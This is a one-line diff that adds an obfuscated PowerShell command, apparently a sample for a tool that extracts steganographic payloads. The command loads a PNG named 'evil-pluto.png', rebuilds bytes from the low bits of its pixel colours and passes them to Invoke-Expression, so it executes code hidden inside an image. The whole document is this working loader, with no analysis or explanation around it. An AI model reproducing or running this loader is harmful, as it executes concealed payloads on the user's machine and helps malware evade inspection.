@@ -1,0 +1,1 @@
+sal a New-Object;Add-Type -AssemblyName "System.Drawing";$g=a System.Drawing.Bitmap("C:\Extract-Invoke-PSImage\sample\evil-pluto.png");$o=a Byte[] 404;(0..0)|%{foreach($x in(0..403)){$p=$g.GetPixel($x,$_);$o[$_*404+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..29]))
